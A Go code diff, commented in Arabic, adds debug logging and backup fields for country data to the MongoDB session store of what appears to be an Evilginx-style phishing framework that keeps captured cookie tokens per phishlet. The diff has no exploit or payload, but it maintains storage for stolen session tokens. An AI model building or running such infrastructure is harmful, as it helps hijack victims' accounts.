@@ -119,6 +119,11 @@ func (m *MongoDatabase) Close() error {
 
 // convertToMongoSession يحول كائن Session التقليدي إلى كائن MongoSession
 func convertToMongoSession(s *Session) *MongoSession {
+	// طباعة البيانات قبل التحويل
+	log.Debug("[MongoDB] تحويل Session إلى MongoSession:")
+	log.Debug("[MongoDB] - Session.CountryCode: '%s'", s.CountryCode)
+	log.Debug("[MongoDB] - Session.Country: '%s'", s.Country)
+
 	// تحويل CookieTokens
 	cookieTokens := make(map[string]map[string]interface{})
 	for domain, tokens := range s.CookieTokens {
@@ -133,7 +138,7 @@ func convertToMongoSession(s *Session) *MongoSession {
 		}
 	}
 
-	return &MongoSession{
+	mongoSession := &MongoSession{
 		Id:           s.Id,
 		Phishlet:     s.Phishlet,
 		LandingURL:   s.LandingURL,
@@ -152,10 +157,22 @@ func convertToMongoSession(s *Session) *MongoSession {
 		CountryCode:  s.CountryCode,
 		Country:      s.Country,
 	}
+	
+	// طباعة البيانات بعد التحويل
+	log.Debug("[MongoDB] بعد التحويل:")
+	log.Debug("[MongoDB] - MongoSession.CountryCode: '%s'", mongoSession.CountryCode)
+	log.Debug("[MongoDB] - MongoSession.Country: '%s'", mongoSession.Country)
+
+	return mongoSession
 }
 
 // convertFromMongoSession يحول كائن MongoSession إلى كائن Session التقليدي
 func convertFromMongoSession(ms *MongoSession) *Session {
+	// طباعة البيانات قبل التحويل
+	log.Debug("[MongoDB] تحويل MongoSession إلى Session:")
+	log.Debug("[MongoDB] - MongoSession.CountryCode: '%s'", ms.CountryCode)
+	log.Debug("[MongoDB] - MongoSession.Country: '%s'", ms.Country)
+
 	// تحويل CookieTokens
 	cookieTokens := make(map[string]map[string]*CookieToken)
 	for domain, tokens := range ms.CookieTokens {
@@ -172,7 +189,7 @@ func convertFromMongoSession(ms *MongoSession) *Session {
 		}
 	}
 
-	return &Session{
+	session := &Session{
 		Id:           ms.Id,
 		Phishlet:     ms.Phishlet,
 		LandingURL:   ms.LandingURL,
@@ -191,6 +208,27 @@ func convertFromMongoSession(ms *MongoSession) *Session {
 		CountryCode:  ms.CountryCode,
 		Country:      ms.Country,
 	}
+	
+	// طباعة البيانات بعد التحويل
+	log.Debug("[MongoDB] بعد التحويل:")
+	log.Debug("[MongoDB] - Session.CountryCode: '%s'", session.CountryCode)
+	log.Debug("[MongoDB] - Session.Country: '%s'", session.Country)
+	
+	// إضافة البيانات للحقول المخصصة كاحتياط إضافي
+	if session.Custom == nil {
+		session.Custom = make(map[string]string)
+	}
+	
+	// نسخ بيانات البلد إلى الحقول المخصصة
+	if ms.CountryCode != "" {
+		session.Custom["country_code_backup"] = ms.CountryCode
+	}
+	
+	if ms.Country != "" {
+		session.Custom["country_backup"] = ms.Country
+	}
+
+	return session
 }
 
 // getStringValue يستخرج قيمة نصية من interface{}
@@ -331,6 +369,9 @@ func (m *MongoDatabase) GetSessionById(id int) (*Session, error) {
 func (m *MongoDatabase) GetSessionBySid(sid string) (*Session, error) {
 	log.Debug("[MongoDB] البحث عن الجلسة بواسطة SID: %s", sid)
 	
+	// تحقق من البيانات المخزنة فعلياً في MongoDB
+	m.ShowSessionDataInMongoDB(sid)
+	
 	var mongoSession MongoSession
 	err := m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&mongoSession)
 	if err != nil {
@@ -343,7 +384,45 @@ func (m *MongoDatabase) GetSessionBySid(sid string) (*Session, error) {
 	}
 	
 	log.Debug("[MongoDB] تم العثور على الجلسة: %s (ID: %d)", sid, mongoSession.Id)
+	
+	// عرض وطباعة المعلومات المهمة
+	log.Success("[MongoDB] معلومات البلد المستردة من MongoDB: رمز البلد: '%s'، البلد: '%s'", 
+		mongoSession.CountryCode, mongoSession.Country)
+	
 	return convertFromMongoSession(&mongoSession), nil
+}
+
+// ShowSessionDataInMongoDB يُظهر البيانات الخام للجلسة من قاعدة البيانات
+func (m *MongoDatabase) ShowSessionDataInMongoDB(sid string) {
+	log.Debug("[MongoDB] استعراض البيانات الخام للجلسة: %s", sid)
+	
+	var rawDocument bson.M
+	err := m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&rawDocument)
+	if err != nil {
+		log.Error("[MongoDB] فشل استرداد البيانات الخام: %v", err)
+		return
+	}
+	
+	// طباعة الحقول المهمة
+	log.Debug("[MongoDB] البيانات الخام من MongoDB:")
+	log.Debug("[MongoDB] - _id: %v", rawDocument["_id"])
+	log.Debug("[MongoDB] - session_id: %v", rawDocument["session_id"])
+	log.Debug("[MongoDB] - id: %v", rawDocument["id"])
+	log.Debug("[MongoDB] - country_code: '%v' (نوع: %T)", rawDocument["country_code"], rawDocument["country_code"])
+	log.Debug("[MongoDB] - country: '%v' (نوع: %T)", rawDocument["country"], rawDocument["country"])
+	
+	// البيانات الاختبارية
+	log.Debug("[MongoDB] - test_country: '%v'", rawDocument["test_country"])
+	log.Debug("[MongoDB] - test_code: '%v'", rawDocument["test_code"])
+	log.Debug("[MongoDB] - direct_update: '%v'", rawDocument["direct_update"])
+	log.Debug("[MongoDB] - country_code_raw: '%v'", rawDocument["country_code_raw"])
+	log.Debug("[MongoDB] - country_raw: '%v'", rawDocument["country_raw"])
+	
+	// البيانات من الحقول المخصصة
+	if customData, ok := rawDocument["custom"].(map[string]interface{}); ok {
+		log.Debug("[MongoDB] - custom.country_code_custom: '%v'", customData["country_code_custom"])
+		log.Debug("[MongoDB] - custom.country_custom: '%v'", customData["country_custom"])
+	}
 }
 
 // UpdateSession يحدث جلسة في MongoDB
@@ -692,70 +771,94 @@ func (m *MongoDatabase) SetSessionCookieTokens(sid string, tokens map[string]map
 func (m *MongoDatabase) SetSessionCountryInfo(sid string, countryCode, country string) error {
 	log.Debug("[MongoDB] محاولة تحديث معلومات البلد للجلسة: %s (رمز البلد: %s، البلد: %s)", sid, countryCode, country)
 	
+	// إنشاء قيم اختبار إضافية للتأكد
+	testCountryValue := "TEST-" + country
+	testCodeValue := "TEST-" + countryCode
+	
+	// طريقة مباشرة لتحديث الحقول المحددة فقط
+	directResult, err := m.sessionsColl.UpdateOne(
+		m.ctx,
+		bson.M{"session_id": sid},
+		bson.D{
+			{"$set", bson.D{
+				{"country_code", countryCode},
+				{"country", country},
+				{"test_country", testCountryValue},      // حقل اختبار إضافي
+				{"test_code", testCodeValue},            // حقل اختبار إضافي
+				{"direct_update", "true"},               // علامة للتأكيد
+				{"update_time", time.Now().UTC().Unix()},
+			}},
+		},
+	)
+	
+	if err != nil {
+		log.Error("[MongoDB] فشل في التحديث المباشر: %v", err)
+		return err
+	}
+	
+	log.Success("[MongoDB] نتيجة التحديث المباشر: وثائق معدلة = %d", directResult.ModifiedCount)
+	
 	// الحصول على الجلسة الحالية أولاً
 	var session MongoSession
-	err := m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&session)
+	err = m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&session)
 	if err != nil {
 		log.Error("[MongoDB] فشل العثور على الجلسة: %v", err)
 		return err
 	}
 	
-	// عرض معلومات الجلسة قبل التحديث
-	log.Debug("[MongoDB] معلومات الجلسة قبل التحديث - المعرف: %s، رمز البلد: %s، البلد: %s", 
-		session.SessionId, session.CountryCode, session.Country)
+	// عرض معلومات الجلسة بعد التحديث
+	log.Debug("[MongoDB] معلومات الجلسة بعد التحديث المباشر:")
+	log.Debug("[MongoDB] - session_id: %s", session.SessionId)
+	log.Debug("[MongoDB] - id: %d", session.Id)
+	log.Debug("[MongoDB] - country_code: '%s'", session.CountryCode)
+	log.Debug("[MongoDB] - country: '%s'", session.Country)
 	
-	// تحديث الجلسة في الذاكرة
-	session.CountryCode = countryCode
-	session.Country = country
-	session.UpdateTime = time.Now().UTC().Unix()
-	
-	// تحديث الجلسة في قاعدة البيانات باستخدام الوثيقة كاملة
-	result, err := m.sessionsColl.ReplaceOne(
-		m.ctx,
-		bson.M{"session_id": sid},
-		session,
-	)
-	
+	// استرداد الوثيقة كاملةً من MongoDB باستخدام نموذج خام
+	var rawDocument bson.M
+	err = m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&rawDocument)
 	if err != nil {
-		log.Error("[MongoDB] فشل تحديث معلومات البلد: %v", err)
-		return err
-	}
-	
-	log.Success("[MongoDB] تم استبدال وثيقة الجلسة بالكامل، وثائق معدلة: %d", result.ModifiedCount)
-	
-	// محاولة ثانية باستخدام طريقة تحديث مختلفة - تحديث محدد للحقول فقط
-	updateResult, err := m.sessionsColl.UpdateOne(
-		m.ctx,
-		bson.M{"session_id": sid},
-		bson.M{
-			"$set": bson.M{
-				"country_code": countryCode,
-				"country":      country,
-			},
-		},
-	)
-	
-	if err != nil {
-		log.Error("[MongoDB] فشل في طريقة التحديث الثانية: %v", err)
+		log.Error("[MongoDB] فشل استرداد الوثيقة الخام: %v", err)
 	} else {
-		log.Success("[MongoDB] تمت محاولة التحديث الثانية، وثائق معدلة: %d", updateResult.ModifiedCount)
-	}
-	
-	// التحقق من أن البيانات تم حفظها فعلاً
-	var updatedSession MongoSession
-	err = m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&updatedSession)
-	if err != nil {
-		log.Error("[MongoDB] فشل استرجاع الجلسة المحدثة: %v", err)
-	} else {
-		log.Success("[MongoDB] تأكيد الحفظ: تم استرجاع معلومات البلد - رمز البلد: '%s'، البلد: '%s'", 
-			updatedSession.CountryCode, updatedSession.Country)
+		// طباعة كل الحقول في الوثيقة
+		log.Debug("[MongoDB] الوثيقة الخام المستردة من MongoDB:")
 		
-		// طباعة كل الحقول المهمة في الجلسة
-		log.Debug("[MongoDB] معلومات الجلسة الكاملة بعد التحديث:")
-		log.Debug("[MongoDB] - session_id: %s", updatedSession.SessionId)
-		log.Debug("[MongoDB] - id: %d", updatedSession.Id)
-		log.Debug("[MongoDB] - country_code: '%s'", updatedSession.CountryCode)
-		log.Debug("[MongoDB] - country: '%s'", updatedSession.Country)
+		// طباعة الحقول الرئيسية التي نهتم بها
+		log.Debug("[MongoDB] - test_country: '%v'", rawDocument["test_country"])
+		log.Debug("[MongoDB] - test_code: '%v'", rawDocument["test_code"])
+		log.Debug("[MongoDB] - direct_update: '%v'", rawDocument["direct_update"])
+		log.Debug("[MongoDB] - country_code: '%v'", rawDocument["country_code"])
+		log.Debug("[MongoDB] - country: '%v'", rawDocument["country"])
+		
+		// محاولة إضافية: تحديث الوثيقة مباشرة باستخدام خريطة البيانات الخام
+		rawDocument["country_code_raw"] = countryCode
+		rawDocument["country_raw"] = country
+		
+		_, err = m.sessionsColl.ReplaceOne(
+			m.ctx,
+			bson.M{"session_id": sid},
+			rawDocument,
+		)
+		
+		if err != nil {
+			log.Error("[MongoDB] فشل تحديث الوثيقة الخام: %v", err)
+		} else {
+			log.Success("[MongoDB] تم تحديث الوثيقة الخام بنجاح")
+		}
+	}
+	
+	// تحديث دائم باستخدام حل بديل عن طريق Custom
+	customKey1 := "country_code_custom"
+	customKey2 := "country_custom"
+	
+	// استخدام طريقة UpdateSessionCustom التي نعلم أنها تعمل
+	err = m.UpdateSessionCustom(sid, customKey1, countryCode)
+	if err != nil {
+		log.Error("[MongoDB] فشل تحديث country_code عن طريق حقل مخصص: %v", err)
+	}
+	
+	err = m.UpdateSessionCustom(sid, customKey2, country)
+	if err != nil {
+		log.Error("[MongoDB] فشل تحديث country عن طريق حقل مخصص: %v", err)
 	}
 	
 	return nil
